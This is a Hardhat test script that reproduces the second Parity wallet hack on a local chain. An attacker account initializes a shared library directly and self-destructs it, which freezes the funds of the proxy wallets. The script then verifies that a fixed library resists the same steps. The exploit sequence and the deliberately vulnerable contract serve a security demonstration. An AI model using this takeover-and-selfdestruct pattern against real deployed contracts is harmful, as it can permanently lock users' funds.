import hre from "hardhat";
const { ethers } = hre;
import { initLog, assert, eth } from "./lib.js";

async function main() {
  const { log, save } = initLog("parity2_freeze.log");
  const [deployer, owner1, owner2, owner3, attackerEOA] = await ethers.getSigners();

  log("=".repeat(60));
  log("  PARITY HACK #2 — Library Self-Destruct → Frozen Funds");
  log("=".repeat(60));

  const libIface = new ethers.Interface([
    "function initWallet(address _owner)",
    "function execute(address to, uint256 value, bytes calldata data)",
    "function killLibrary()"
  ]);

  // ─────────────────────────────────────────────────────────
  // Setup
  // ─────────────────────────────────────────────────────────
  log("\n[1] Deploying SharedWalletLibraryVulnerable...");
  const Library = await ethers.getContractFactory("SharedWalletLibraryVulnerable");
  const library = await Library.deploy();
  await library.waitForDeployment();
  log(`  Library: ${library.target}`);

  const codeBefore = await ethers.provider.getCode(library.target);
  log(`  Library code size (before): ${(codeBefore.length - 2) / 2} bytes`);
  log(assert(codeBefore.length > 2, "Library has code before attack"));

  log("\n[2] Deploying 3 SharedWallet proxies (all pointing to same library)...");
  const SharedWallet = await ethers.getContractFactory("SharedWallet");
  const [wallet1, wallet2, wallet3] = await Promise.all([
    SharedWallet.deploy(library.target).then(w => w.waitForDeployment().then(() => w)),
    SharedWallet.deploy(library.target).then(w => w.waitForDeployment().then(() => w)),
    SharedWallet.deploy(library.target).then(w => w.waitForDeployment().then(() => w))
  ]);
  log(`  Wallet1: ${wallet1.target}`);
  log(`  Wallet2: ${wallet2.target}`);
  log(`  Wallet3: ${wallet3.target}`);

  log("\n[3] Funding each wallet with 5 ETH...");
  for (const w of [wallet1, wallet2, wallet3]) {
    await deployer.sendTransaction({ to: w.target, value: ethers.parseEther("5") });
  }

  log("\n[4] Initializing each wallet with its proper owner (via delegatecall)...");
  const owners = [owner1, owner2, owner3];
  const wallets = [wallet1, wallet2, wallet3];
  for (let i = 0; i < 3; i++) {
    await owners[i].sendTransaction({
      to: wallets[i].target,
      data: libIface.encodeFunctionData("initWallet", [owners[i].address])
    });
    log(`  Wallet${i + 1} owner: ${await wallets[i].owner()}`);
  }

  log("\n  Balances before attack:");
  for (let i = 0; i < 3; i++) {
    log(`  Wallet${i + 1}: ${eth(await ethers.provider.getBalance(wallets[i].target))}`);
  }

  // ─────────────────────────────────────────────────────────
  // Attack
  // ─────────────────────────────────────────────────────────
  log("\n[5] ATTACK step 1: attacker calls initWallet() DIRECTLY on the library...");
  log("  (Not via proxy — this writes to the library's own storage, not a proxy's)");

  await library.connect(attackerEOA).initWallet(attackerEOA.address);
  log(`  Library's own owner: ${await library.owner()}`);
  log(assert(await library.owner() === attackerEOA.address,
    "Attacker now owns the library contract directly"));

  log("\n[6] ATTACK step 2: attacker calls killLibrary() to selfdestruct the library...");
  const codeBeforeKill = await ethers.provider.getCode(library.target);
  log(`  Library code size before kill: ${(codeBeforeKill.length - 2) / 2} bytes`);

  await library.connect(attackerEOA).killLibrary();

  // Mine one more block so selfdestruct effects are visible
  await ethers.provider.send("hardhat_mine", ["0x1"]);

  const codeAfterKill = await ethers.provider.getCode(library.target);
  log(`  Library code size after kill:  ${(codeAfterKill.length - 2) / 2} bytes`);
  log(assert(codeAfterKill === "0x", "Library code = 0x (selfdestruct confirmed)"));

  // ─────────────────────────────────────────────────────────
  // Frozen funds verification
  // ─────────────────────────────────────────────────────────
  log("\n[7] Checking wallet balances after library destruction...");
  for (let i = 0; i < 3; i++) {
    const bal = await ethers.provider.getBalance(wallets[i].target);
    log(`  Wallet${i + 1}: ${eth(bal)}  ← FROZEN (ETH not stolen, only inaccessible)`);
    log(assert(bal === ethers.parseEther("5"),
      `Wallet${i + 1}: 5 ETH still present (frozen, not stolen)`));
  }

  log("\n[8] Owners try to execute() — should fail (library code is gone)...");
  const execData = libIface.encodeFunctionData("execute",
    [owner1.address, ethers.parseEther("1"), "0x"]);
  let execFailed = false;
  try {
    await owner1.sendTransaction({ to: wallet1.target, data: execData });
  } catch {
    execFailed = true;
  }
  log(`  Execute reverted: ${execFailed}`);
  log(assert(execFailed, "Execute fails after library self-destruct (Library code not found)"));

  log("\n" + "=".repeat(60));
  log("  IMPORTANT: THIS IS NOT A THEFT");
  log("=".repeat(60));
  log("  The attacker did NOT steal wallet ETH.");
  log("  The shared library code was destroyed via selfdestruct.");
  log("  All proxies that relied on this library can no longer delegatecall.");
  log("  Wallet funds are FROZEN — permanently inaccessible.");

  // ─────────────────────────────────────────────────────────
  // Fixed library demo
  // ─────────────────────────────────────────────────────────
  log("\n" + "=".repeat(60));
  log("  SHAREDWALLETLIBRARYFIXED — Protection Verification");
  log("=".repeat(60));

  const LibraryFixed = await ethers.getContractFactory("SharedWalletLibraryFixed");
  const libFixed = await LibraryFixed.deploy();
  await libFixed.waitForDeployment();
  log(`  Fixed library deployed: ${libFixed.target}`);

  // Proxy wallet using fixed library
  const SharedWallet2 = await ethers.getContractFactory("SharedWallet");
  const wFixed = await SharedWallet2.deploy(libFixed.target);
  await wFixed.waitForDeployment();
  await deployer.sendTransaction({ to: wFixed.target, value: ethers.parseEther("3") });

  // Normal initialization via proxy delegatecall — must work
  await owner1.sendTransaction({
    to: wFixed.target,
    data: libIface.encodeFunctionData("initWallet", [owner1.address])
  });
  log(`  Fixed wallet owner (set via delegatecall): ${await wFixed.owner()}`);
  log(assert(await wFixed.owner() === owner1.address,
    "Fixed wallet: legitimate initialization via delegatecall works"));

  // Direct library init — must fail
  let directInitFailed = false;
  try {
    await attackerEOA.sendTransaction({
      to: libFixed.target,
      data: libIface.encodeFunctionData("initWallet", [attackerEOA.address])
    });
  } catch {
    directInitFailed = true;
  }
  log(`  Direct library initWallet reverted: ${directInitFailed}`);
  log(assert(directInitFailed, "Fixed library: direct initialization rejected"));

  // No killLibrary — confirmed by trying to call it
  log("\n  No killLibrary function — checking library is still alive...");
  const codeFixed = await ethers.provider.getCode(libFixed.target);
  log(`  Fixed library code size: ${(codeFixed.length - 2) / 2} bytes`);
  log(assert(codeFixed.length > 2, "Fixed library: still has code (no selfdestruct path)"));

  // Owner can still use fixed wallet normally
  const execDataFixed = libIface.encodeFunctionData("execute",
    [owner1.address, ethers.parseEther("1"), "0x"]);
  await owner1.sendTransaction({ to: wFixed.target, data: execDataFixed });
  const wFixedBal = await ethers.provider.getBalance(wFixed.target);
  log(`  Fixed wallet balance after legitimate withdraw: ${eth(wFixedBal)}`);
  log(assert(wFixedBal === ethers.parseEther("2"),
    "Fixed wallet: owner can execute normally"));

  log("\n" + "=".repeat(60));
  log("  PARITY #2 SIMULATION COMPLETE");
  log("=".repeat(60));

  save();
}

main().catch((e) => { console.error(e); process.exit(1); });
